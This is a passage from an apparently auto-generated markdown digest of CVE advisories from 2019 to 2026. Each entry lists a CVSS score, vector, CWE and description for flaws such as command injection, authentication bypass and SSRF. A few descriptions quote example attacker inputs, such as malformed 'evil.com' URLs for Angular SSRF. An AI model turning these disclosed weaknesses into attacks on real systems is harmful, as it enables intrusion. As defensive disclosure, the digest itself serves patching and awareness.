The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data.

### CVE-2024-5806

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-287` |
| Published | 2024-06-25T15:04:37.342Z |

Improper Authentication vulnerability in Progress MOVEit Transfer (SFTP module) can lead to Authentication Bypass.This issue affects MOVEit Transfer: from 2023.0.0 before 2023.0.11, from 2023.1.0 before 2023.1.6, from 2024.0.0 before 2024.0.2.

### CVE-2024-22120

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2024-05-17T09:53:52.798Z |

Zabbix server can perform command execution for configured scripts. After command is executed, audit entry is added to "Audit Log". Due to "clientip" field is not sanitized, it is possible to injection SQL into "clientip" and exploit time based blind SQL injection.

### CVE-2024-21887

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2024-01-12T17:02:16.481Z |

A command injection vulnerability in web components of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x)  allows an authenticated administrator to send specially crafted requests and execute arbitrary commands on the appliance.

### CVE-2023-34329

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-306;CWE-290` |
| Published | 2023-07-18T17:11:10.532Z |

AMI MegaRAC SPx12 contains a vulnerability in BMC where a User may cause an authentication bypass by spoofing the HTTP header. A successful exploit of this vulnerability may lead to loss of confidentiality, integrity, and availability.

### CVE-2022-1162

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `N/A` |
| Published | 2022-04-04T19:46:14.000Z |

A hardcoded password was set for accounts registered using an OmniAuth provider (e.g. OAuth, LDAP, SAML) in GitLab CE/EE versions 14.7 prior to 14.7.7, 14.8 prior to 14.8.5, and 14.9 prior to 14.9.2 allowing attackers to potentially take over accounts

### CVE-2021-40412

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2022-01-28T19:10:16.000Z |

An OScommand injection vulnerability exists in the device network settings functionality of reolink RLC-410W v3.0.0.136_20121102. At [8] the devname variable, that has the value of the name parameter provided through the SetDevName API, is not validated properly. This would lead to an OS command injection.

### CVE-2021-40410

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2022-01-28T19:10:15.000Z |

An OS command injection vulnerability exists in the device network settings functionality of reolink RLC-410W v3.0.0.136_20121102. At [4] the dns_data->dns1 variable, that has the value of the dns1 parameter provided through the SetLocal API, is not validated properly. This would lead to an OS command injection.

### CVE-2021-40407

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2022-01-28T19:10:13.000Z |

An OS command injection vulnerability exists in the device network settings functionality of reolink RLC-410W v3.0.0.136_20121102. At [1] or [2], based on DDNS type, the ddns->domain variable, that has the value of the domain parameter provided through the SetDdns API, is not validated properly. This would lead to an OS command injection. An attacker can send an HTTP request to trigger this vulnerability.

### CVE-2022-23131

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-290` |
| Published | 2022-01-13T15:50:39.137Z |

In the case of instances where the SAML SSO authentication is enabled (non-default), session data can be modified by a malicious actor, because a user login stored in the session was not verified. Malicious unauthenticated actor may exploit this issue to escalate privileges and gain admin access to Zabbix Frontend. To perform the attack, SAML authentication is required to be enabled and the actor has to know the username of Zabbix user (or use the guest account, which is disabled by default).

### CVE-2021-34473

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-07-14T17:54:03.000Z |

Microsoft Exchange Server Remote Code Execution Vulnerability

### CVE-2020-17132

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2020-12-09T23:36:50.000Z |

Microsoft Exchange Remote Code Execution Vulnerability

### CVE-2020-27130

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-35` |
| Published | 2020-11-17T03:10:26.483Z |

A vulnerability in Cisco Security Manager could allow an unauthenticated, remote attacker to gain access to sensitive information. The vulnerability is due to improper validation of directory traversal character sequences within requests to an affected device. An attacker could exploit this vulnerability by sending a crafted request to the affected device. A successful exploit could allow the attacker to download arbitrary files from the affected device.

### CVE-2018-13379

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `N/A` |
| Published | 2019-06-04T20:18:08.000Z |

An Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal") in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL VPN web portal allows an unauthenticated attacker to download system files via special crafted HTTP resource requests.

### CVE-2026-11374

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-287;CWE-330;CWE-340` |
| Published | 2026-06-23T09:16:28.477 |

In ManageEngine ADSelfService Plus, RecoveryManager Plus, M365 Manager Plus, and ADAudit Plus, the SSO tickets generated to authenticate that session could be predicted
 by an unauthenticated user, leading to account takeover.

### CVE-2026-12249

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:N/AU:Y/R:I/V:D/RE:L/U:Red` |
| Weaknesses | `CWE-348` |
| Published | 2026-06-22T18:16:31.917 |

An issue was discovered in Canonical ADSys upstream versions through v0.16.2. During Active Directory Certificate Services (AD CS) certificate auto-enrollment via the vendored Samba client script (internal/policies/certificate/python/vendor_samba/gp/gp_cert_auto_enroll_ext.py), ADSys utilizes a plaintext HTTP connection (http://) instead of a secure HTTPS connection (https://) to request the CA certificate from the Active Directory Certificate Services server (GetCACert). An unauthenticated network attacker positioned between the managed Ubuntu host and the configured AD CS CA hostname can conduct a Man-in-the-Middle (MITM) attack. By intercepting the plaintext HTTP request, the attacker can supply an arbitrary, attacker-controlled Root CA certificate. Because the system automatically accepts this certificate and registers it into the local system trust store via update-ca-certificates, this results in system-wide trust store poisoning. Consequently, TLS clients utilizing the operating system trust store on the affected machine will accept rogue certificates for arbitrary domains, enabling persistent decryption and interception of subsequent TLS connections. This issue is resolved in version v0.16.3.

### CVE-2025-48703

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-09-19T00:00:00.000Z |

CWP (aka Control Web Panel or CentOS Web Panel) before 0.9.8.1205 allows unauthenticated remote code execution via shell metacharacters in the t_total parameter in a filemanager changePerm request. A valid non-root username must be known.

### CVE-2025-48828

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-424` |
| Published | 2025-05-27T00:00:00.000Z |

Certain vBulletin versions might allow attackers to execute arbitrary PHP code by abusing Template Conditionals in the template engine. By crafting template code in an alternative PHP function invocation syntax, such as the "var_dump"("test") syntax, attackers can bypass security checks and execute arbitrary PHP code, as exploited in the wild in May 2025.

### CVE-2025-30406

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-321` |
| Published | 2025-04-03T00:00:00.000Z |

Gladinet CentreStack through 16.1.10296.56315 (fixed in 16.4.10315.56368) has a deserialization vulnerability due to the CentreStack portal's hardcoded machineKey use, as exploited in the wild in March 2025. This enables threat actors (who know the machineKey) to serialize a payload for server-side deserialization to achieve remote code execution. NOTE: a CentreStack admin can manually delete the machineKey defined in portal\web.config.

### CVE-2025-0282

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2025-01-08T22:15:09.386Z |

A stack-based buffer overflow in Ivanti Connect Secure before version 22.7R2.5, Ivanti Policy Secure before version 22.7R1.2, and Ivanti Neurons for ZTA gateways before version 22.7R2.3 allows a remote unauthenticated attacker to achieve remote code execution.

### CVE-2023-22522

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2023-12-06T05:00:02.870Z |

This Template Injection vulnerability allows an authenticated attacker, including one with anonymous access, to inject unsafe user input into a Confluence page. Using this approach, an attacker is able to achieve Remote Code Execution (RCE) on an affected instance. Publicly accessible Confluence Data Center and Server versions as listed below are at risk and require immediate attention. See the advisory for additional details

Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.

### CVE-2021-35211

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2021-07-14T20:55:25.167Z |

Microsoft discovered a remote code execution (RCE) vulnerability in the SolarWinds Serv-U product utilizing a Remote Memory Escape Vulnerability. If exploited, a threat actor may be able to gain privileged access to the machine hosting Serv-U Only. SolarWinds Serv-U Managed File Transfer and Serv-U Secure FTP for Windows before 15.2.3 HF2 are affected by this vulnerability.

## 🟠 High（CVSS 7.0〜9.0 未満）

### CVE-2024-49368

| 項目 | 値 |
|------|-----|
| CVSS | `8.9` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-20` |
| Published | 2024-10-21T17:04:43.652Z |

Nginx UI is a web user interface for the Nginx web server. Prior to version 2.0.0-beta.36, when Nginx UI configures logrotate, it does not verify the input and directly passes it to exec.Command, causing arbitrary command execution. Version 2.0.0-beta.36 fixes this issue.

### CVE-2026-10711

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2026-06-23T13:16:39.410 |

Missing authentication for critical function vulnerability in AKIN Software Computer Import Export Industry and Trade Ltd. CafePlus allows Accessing Functionality Not Properly Constrained by ACLs.

This issue affects CafePlus: from 12.05.03 before 12.05.04.

### CVE-2026-8163

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2026-06-23T07:16:20.910 |

The Infility Global WordPress plugin before 2.15.19 does not properly sanitize and escape some parameters before using them in SQL statements, leading to a SQL Injection vulnerability exploitable by authenticated users with Subscriber-level access and above.

### CVE-2026-54232

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-427` |
| Published | 2026-06-22T23:16:30.873 |

vLLM is an inference and serving engine for large language models (LLMs). Prior to 0.22.1, the vLLM Dockerfile is vulnerable to a dependency confusion attack through the flashinfer-jit-cache package. The package is installed from a custom index (flashinfer.ai/whl/) using --extra-index-url, but the package name was not registered on PyPI, and UV_INDEX_STRATEGY="unsafe-best-match" is set globally. An attacker who registers flashinfer-jit-cache on PyPI with version 0.6.11.post2 can execute arbitrary code as root during the Docker build and backdoor every resulting container image, enabling exfiltration of all user prompts, API credentials, and model data from production vLLM deployments This vulnerability is fixed in 0.22.1.

### CVE-2026-56324

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-770` |
| Published | 2026-06-22T22:16:52.063 |

Capgo before 12.128.2 contains a rate limit bypass vulnerability in the channel_self endpoint that allows attackers to circumvent rate limiting by rotating the user-controlled device_id parameter. Attackers can send multiple requests per second by changing device_id values to flood the channel_devices table and cause database exhaustion.

### CVE-2026-44272

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-06-22T20:16:29.227 |

Dell Wyse Management Suite (WMS), versions prior to WMS 2605, contain an Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability. A low privileged attacker with remote access could potentially exploit this vulnerability, leading to Unauthorized access.

### CVE-2026-50168

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-346;CWE-918` |
| Published | 2026-06-22T18:16:42.117 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.0-rc.2, 21.2.15, 20.3.22, and 19.2.23, an issue in the @angular/platform-server package allows remote attackers to bypass host allowlist constraints and direct server-side outgoing requests to arbitrary external endpoints. This occurs due to a parser differential between the strict WHATWG URL parser used for allowlist validation and the lenient Domino URL parser used to initialize the server emulated DOM. When a server-side request contains a malformed URL with a double port structure (e.g., http://evil.com:80:80/path), Node's strict URL.canParse(url) logic returns false and skips host check validation entirely. However, the same malformed URL is later accepted and parsed leniently by Domino's internal parser, which resolves the origin to http://evil.com:80. The Angular SSR HTTP request interceptor (relativeUrlsTransformerInterceptorFn) then resolves all relative backend HTTP requests against this adopted origin, executing the SSRF attack. This vulnerability is fixed in 22.0.0-rc.2, 21.2.15, 20.3.22, and 19.2.23.

### CVE-2026-46417

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:L/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-918` |
| Published | 2026-06-22T18:16:38.470 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.0-next.12, 21.2.13, 20.3.21, and 19.2.22, a Server-Side Request Forgery (SSRF) vulnerability exists in @angular/platform-server. The issue stems from how the server-side rendering (SSR) engine processes the request URL provided to the rendering entry points. When an absolute-form URL (e.g., http://evil.com) is passed to the rendering engine, the internal ServerPlatformLocation can be manipulated into adopting the attacker-controlled domain as the "current" hostname. Consequently, any relative HttpClient requests or PlatformLocation.hostname references are redirected to the attacker controlled server, potentially exposing internal APIs or metadata services. This vulnerability is fixed in 22.0.0-next.12, 21.2.13, 20.3.21, and 19.2.22.

### CVE-2026-54266

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-328;CWE-345` |
| Published | 2026-06-22T16:16:39.313 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.1, 21.2.17, and 20.3.25, Angular's HttpTransferCache caches HTTP requests made during Server-Side Rendering (SSR) so that they can be reused during client-side hydration. This avoids repeating the same HTTP requests on the client. The cached responses are stored in TransferState using a cache key generated by hashing request properties (method, response type, mapped URL, serialized body, and sorted query parameters). The cache keys are generated using a weak 32-bit DJB2-like polynomial rolling hash. The 32-bit hash space is extremely small, allowing attackers to find hash collisions. An attacker can easily find a query parameter string (e.g., q=aaCAZMMM for a search request) that produces the exact same 32-bit hash as a sensitive endpoint (e.g., /api/user/profile). When a victim visits a crafted link containing the colliding parameter, the SSR process executes both the search request and the profile request. Due to the hash collision, the search response overwrites the profile response in the TransferState cache. This vulnerability is fixed in 22.0.1, 21.2.17, and 20.3.25.

### CVE-2025-48826

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-134` |
| Published | 2025-10-07T13:55:06.364Z |

A format string vulnerability exists in the formPingCmd functionality of Planet WGR-500 v1.3411b190912. A specially crafted series of HTTP requests can lead to memory corruption. An attacker can send a series of HTTP requests to trigger this vulnerability.

### CVE-2025-24514

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2025-03-24T23:29:36.802Z |

A security issue was discovered in  ingress-nginx https://github.com/kubernetes/ingress-nginx  where the `auth-url` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

### CVE-2025-1098

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2025-03-24T23:29:15.610Z |

A security issue was discovered in  ingress-nginx https://github.com/kubernetes/ingress-nginx  where the `mirror-target` and `mirror-host` Ingress annotations can be used to inject arbitrary configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

### CVE-2025-1097

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2025-03-24T23:29:05.879Z |

A security issue was discovered in  ingress-nginx https://github.com/kubernetes/ingress-nginx  where the `auth-tls-match-cn` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

### CVE-2024-12284

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:A/AC:H/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-269` |
| Published | 2025-02-19T23:30:11.146Z |

Authenticated privilege escalation in NetScaler Console and NetScaler Agent allows.

### CVE-2025-0108

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/AU:N/R:U/V:C/RE:M/U:Red` |
| Weaknesses | `CWE-306` |
| Published | 2025-02-12T20:55:34.610Z |

An authentication bypass in the Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to bypass the authentication otherwise required by the PAN-OS management web interface and invoke certain PHP scripts. While invoking these PHP scripts does not enable remote code execution, it can negatively impact integrity and confidentiality of PAN-OS.

You can greatly reduce the risk of this issue by restricting access to the management web interface to only trusted internal IP addresses according to our recommended  best practices deployment guidelines https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431 .

This issue does not affect Cloud NGFW or Prisma Access software.

### CVE-2024-40891

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-02-04T10:02:48.018Z |

**UNSUPPORTED WHEN ASSIGNED**
A post-authentication command injection vulnerability in the management commands of the legacy DSL CPE Zyxel VMG4325-B10A firmware version 1.00(AAFR.4)C0_20170615 could allow an authenticated attacker to execute operating system (OS) commands on an affected device via Telnet.

### CVE-2024-40890

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-02-04T09:55:38.908Z |

**UNSUPPORTED WHEN ASSIGNED**
A post-authentication command injection vulnerability in the CGI program of the legacy DSL CPE Zyxel VMG4325-B10A firmware version 1.00(AAFR.4)C0_20170615 could allow an authenticated attacker to execute operating system (OS) commands on an affected device by sending a crafted HTTP POST request.

### CVE-2024-52875

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-113` |
| Published | 2025-01-31T00:00:00.000Z |

An issue was discovered in GFI Kerio Control 9.2.5 through 9.4.5. The dest GET parameter passed to the /nonauth/addCertException.cs and /nonauth/guestConfirm.cs and /nonauth/expiration.cs pages is not properly sanitized before being used to generate a Location HTTP header in a 302 HTTP response. This can be exploited to perform Open Redirect or HTTP Response Splitting attacks, which in turn lead to Reflected Cross-Site Scripting (XSS). Remote command execution can be achieved by leveraging the upgrade feature in the admin interface.

### CVE-2025-21385

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-918` |
| Published | 2025-01-09T22:07:25.838Z |

A Server-Side Request Forgery (SSRF) vulnerability in Microsoft Purview allows an authorized attacker to disclose information over a network.

### CVE-2024-7399

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22;CWE-434` |
| Published | 2024-08-09T04:43:29.828Z |

Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server version before 21.1050 allows attackers to write arbitrary file as system authority.

### CVE-2024-7029

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-77` |
| Published | 2024-08-02T15:08:35.991Z |

Commands can be injected over the network and executed without authentication.

### CVE-2024-7340

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22` |
| Published | 2024-07-31T15:00:04.218Z |

The Weave server API allows remote users to fetch files from a specific directory, but due to a lack of input validation, it is possible to traverse and leak arbitrary files remotely. In various common scenarios, this allows a low-privileged user to assume the role of the server admin.

### CVE-2024-4112

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2024-04-24T14:31:04.752Z |

A vulnerability classified as critical has been found in Tenda TX9 22.03.02.10. This affects the function sub_42CB94 of the file /goform/SetVirtualServerCfg. The manipulation of the argument list leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-261855. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2023-36025

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2023-11-14T17:57:39.104Z |

Windows SmartScreen Security Feature Bypass Vulnerability

### CVE-2023-39780

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2023-09-11T00:00:00.000Z |

On ASUS RT-AX55 3.0.0.4.386.51598 devices, authenticated attackers can perform OS command injection via the /start_apply.htm qos_bw_rulelist parameter. NOTE: for the similar "token-generated module" issue, see CVE-2023-41345; for the similar "token-refresh module" issue, see CVE-2023-41346; for the similar "check token module" issue, see CVE-2023-41347; and for the similar "code-authentication module" issue, see CVE-2023-41348.

### CVE-2022-27643

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-120` |
| Published | 2023-03-29T00:00:00.000Z |

This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6700v3 1.0.4.120_10.0.91 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of SOAP requests. When parsing the SOAPAction header, the process does not properly validate the length of user-supplied data prior to copying it to a buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-15692.

### CVE-2022-41040

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2022-10-03T00:00:00.000Z |

Microsoft Exchange Server Elevation of Privilege Vulnerability

### CVE-2021-34979

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-120` |
| Published | 2022-01-13T21:44:35.000Z |

This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6260 1.1.0.78_1.0.1 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of SOAP requests. When parsing the SOAPAction header, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-13512.

### CVE-2021-34991

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2021-11-15T15:40:16.000Z |

This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6400v2 1.0.4.106_10.0.80 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the UPnP service, which listens on TCP port 5000 by default. When parsing the uuid request header, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-14110.

### CVE-2021-42321

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-11-10T00:47:43.000Z |

Microsoft Exchange Server Remote Code Execution Vulnerability

### CVE-2021-28474

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
